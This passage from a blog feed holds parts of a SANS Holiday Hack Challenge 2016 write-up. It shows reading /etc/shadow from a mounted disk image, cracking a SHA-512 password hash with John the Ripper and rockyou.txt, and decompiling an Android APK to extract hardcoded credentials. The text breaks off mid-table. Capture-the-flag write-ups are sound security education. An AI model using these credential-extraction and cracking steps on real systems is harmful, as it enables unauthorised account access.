&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# echo $((512*137216))&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;70254592&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now to make a directory to mount the image…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# mkdir /root/cranbian&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Mounting the image to that directory…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# mount -v -o offset=70254592 -t ext4 /cranbian-jessie.img /root/cranbian&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;mount&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/dev/loop1 mounted on /root/cranbian.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can navigate the directory structure as you would normally.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# cd /root/cranbian/&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/cranbian# ls -la&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;total 132&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 21 root root 36864 Dec  5 16:09 .&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 33 root root  4096 Dec 20 05:01 ..&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Nov 23 10:11 bin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Sep 22 23:52 boot&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  4 root root  4096 Sep 22 22:23 dev&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 77 root root  4096 Dec  5 11:25 etc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  3 root root  4096 Nov 21 10:25 home&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 17 root root  4096 Nov 23 10:07 lib&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwx------  2 root root 16384 Sep 22 23:52 lost+found&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Sep 22 22:20 media&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Sep 22 22:20 mnt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  3 root root  4096 Sep 22 22:27 opt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Jan  6  2015 proc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwx------  2 root root  4096 Nov 23 10:14 root&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  5 root root  4096 Sep 22 22:28 run&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Sep 22 22:39 sbin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Sep 22 22:20 srv&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x  2 root root  4096 Apr 12  2015 sys&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxrwxrwt  7 root root  4096 Nov 17 15:17 tmp&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 10 root root  4096 Sep 22 22:20 usr&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 11 root root  4096 Nov 23 10:10 var&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/cranbian#&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To crack the password of a local Linux account with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; you’ll need two things, the /etc/shadow file and the /etc/passwd file.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; tool combines the passwd and shadow files so &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; can attempt to crack them against a wordlist.  Both &lt;code class=&quot;highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; are distributed with &lt;a href=&quot;http://www.openwall.com/john/&quot;&gt;John the Ripper&lt;/a&gt; which comes preconfigured in Kali.  Since I had access to the Cranbian file system now, the rest is pretty straightforward.&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;unshadow&lt;/code&gt; without any parameters will tell you what it is looking for.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/# unshadow&lt;/span&gt; 
&lt;span class=&quot;na&quot;&gt;Usage&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;unshadow PASSWORD-FILE SHADOW-FILE&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Specify the file locations…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/# unshadow /root/cranbian/etc/passwd /root/cranbian/etc/shadow&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;root:*:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;bin:*:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sys:*:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sync:*:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;games:*:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;man:*:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;mail:*:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;news:*:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;proxy:*:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;backup:*:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;systemd-timesync:*:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;systemd-network:*:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;systemd-resolve:*:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;systemd-bus-proxy:*:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;messagebus:*:104:109::/var/run/dbus:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;avahi:*:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;ntp:*:106:111::/home/ntp:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sshd:*:107:65534::/var/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;statd:*:108:65534::/var/lib/nfs:/bin/false&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:1000:1000:,,,:/home/cranpi:/bin/bash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is the output above.  This time I will save it to a text file.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/# unshadow /root/cranbian/etc/passwd /root/cranbian/etc/shadow &amp;gt; /root/unshadow.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Thanks to tips received from talking with the elves during the &lt;a href=&quot;https://quest2016.holidayhackchallenge.com&quot;&gt;Quest&lt;/a&gt;, the popular &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; wordlist will be used to attempt to crack the password.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:~/# john /root/unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Warning&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;crypt&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Use the &quot;--format=crypt&quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Using default input encoding&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;UTF-8&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Press 'q' or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:05:06 0.94% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;03:17:10) 0g/s 519.9p/s 519.9c/s 519.9C/s ilovedogs2..hustlers&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:05:18 0.98% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;03:15:48) 0g/s 521.2p/s 521.2c/s 521.2C/s tony89..tina101&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:05:19 0.98% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;03:15:30) 0g/s 521.4p/s 521.4c/s 521.4C/s spiky..solveig&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:09:37 1.83% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;02:57:38) 0g/s 532.7p/s 532.7c/s 532.7C/s hateall..harley143&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:10:14 1.95% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;02:56:13) 0g/s 534.1p/s 534.1c/s 534.1C/s zablan..yuhuu&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;0g 0:00:10:15 1.96% (ETA&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;02:56:09) 0g/s 534.2p/s 534.2c/s 534.2C/s woodpony..winx club&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;yummycookies     (cranpi)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;1g 0:00:14:24 DONE (2016-12-11 18:26) 0.001156g/s 525.2p/s 525.2c/s 525.2C/s yveth..yulyul&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Use the &quot;--show&quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Session completed&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After about 14 minutes in my VM with 2GB of RAM, the password was discovered.&lt;/p&gt;

&lt;p class=&quot;notice&quot;&gt;Question 5: What is the password for the ‘cranpi’ account on the Cranberry Pi system?
&lt;strong&gt;yummycookies&lt;/strong&gt;&lt;/p&gt;

&lt;p class=&quot;notice&quot;&gt;Question 6: How did you open each terminal door and where had the villain imprisoned Santa?
This feature was so awesome, it deserved a separate section in my write-up.  See the &lt;a href=&quot;/terminals/&quot;&gt;terminals&lt;/a&gt; section for answers to each challenge.  As for Santa, he was imprisoned in his very own Dungeon For Errant Reindeer (DFER), but he had no memory of what happened or who had imprisoned him.  Finding him required beating the OUTATIME Challenge and traveling back in time to 1978.&lt;/p&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Challenges - Part 3</summary></entry><entry><title type="html">Part 2: Awesome Package Konveyance</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt2-2016/" rel="alternate" type="text/html" title="Part 2: Awesome Package Konveyance" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt2-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt2-2016/">&lt;p class=&quot;notice--danger&quot;&gt;Question 3: What username and password are embedded in the APK file?&lt;/p&gt;
&lt;p class=&quot;notice--danger&quot;&gt;Question 4: What is the name of the audible component (audio file) in the SantaGram APK file?&lt;/p&gt;

&lt;p&gt;Now that the APK file has been obtained, the next step is to extract the contents.  To do this, I used &lt;a href=&quot;https://ibotpeaches.github.io/Apktool/&quot;&gt;apktool&lt;/a&gt; to decode the resources within the APK file itself.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;josh@MacBook-Pro ~/HolidayHack2016 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; apktool_2.2.1.jar d SantaGram_4.2.apk
I: Using Apktool 2.2.1 on SantaGram_4.2.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /Users/josh/Library/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

josh@MacBook-Pro ~/HolidayHack2016 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 18040
drwxr-xr-x    5 josh  staff      170 Dec 27 21:07 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x+ 116 josh  staff     3944 Dec 27 21:07 ..
drwxr-xr-x    8 josh  staff      272 Dec 27 21:07 SantaGram_4.2
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 josh  staff  2257390 Dec 27 21:06 SantaGram_4.2.apk
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@   1 josh  staff  6972627 Dec 27 21:07 apktool_2.2.1.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A new directory was created (SantaGram_4.2) containing all the files extracted from the APK.  I did a case insensitive (-i), recursive (-r), &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; command to find text that matches &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; in the SantaGram_4.2 folder.  Since I don’t know if the username and password will be on the same line, using the &lt;code class=&quot;highlighter-rouge&quot;&gt;-A10&lt;/code&gt; flag will display 10 lines after the match, and &lt;code class=&quot;highlighter-rouge&quot;&gt;-B10&lt;/code&gt; flag will display 10 lines before the match. This will give a little buffer to manually search within.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ grep -i -r -A10 -B10 'username' SantaGram_4.2&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-.end method&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-.method public static a(Landroid/content/Context;Ljava/lang/String;)V&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    .locals 4&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    new-instance v0, Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-direct {v0}, Lorg/json/JSONObject;-&amp;gt;&amp;lt;init&amp;gt;()V&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    :try_start_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v1, &quot;username&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v2, &quot;guest&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&amp;gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v1, &quot;password&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v2, &quot;busyreindeer78&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&amp;gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-.end method&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-.method private postDeviceAnalyticsData()V&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    .locals 4&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    new-instance v0, Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-direct {v0}, Lorg/json/JSONObject;-&amp;gt;&amp;lt;init&amp;gt;()V&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    :try_start_0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;const-string v1, &quot;username&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v2, &quot;guest&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&amp;gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v1, &quot;password&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v2, &quot;busyreindeer78&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&amp;gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After manually reviewing the output, it looked like there were matches in 2 different files. Having the extra buffer really helped.&lt;/p&gt;

&lt;p&gt;Additionally, the URL information for the targets in &lt;a href=&quot;/challenges/#part-4-my-gosh-it-s-full-of-holes&quot;&gt;Part 4&lt;/a&gt; was discovered within the &lt;code class=&quot;highlighter-rouge&quot;&gt;./SantaGram_4.2/res/values/strings.xml&lt;/code&gt; file.  The APK file will be revisted again later on.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro ~/HolidayHack2016 $ cat ./SantaGram_4.2/res/values/strings.xml | grep url&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;analytics_launch_url&quot;&amp;gt;https://analytics.northpolewonderland.com/report.php?type=launch&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;analytics_usage_url&quot;&amp;gt;https://analytics.northpolewonderland.com/report.php?type=usage&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;banner_ad_url&quot;&amp;gt;http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;debug_data_collection_url&quot;&amp;gt;http://dev.northpolewonderland.com/index.php&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;dungeon_url&quot;&amp;gt;http://dungeon.northpolewonderland.com/&amp;lt;/string&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&amp;lt;string name=&quot;exhandler_url&quot;&amp;gt;http://ex.northpolewonderland.com/exception.php&amp;lt;/string&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice&quot;&gt;Question 3: What username and password are embedded in the APK file?&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Location&lt;/th&gt;
      &lt;th&gt;File Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Username&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;./SantaGram_4.2/smali/com/northpolewonderland/santagram/&lt;/td&gt;
      &lt;td&gt;b.smali&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;guest&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;busyreindeer78&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
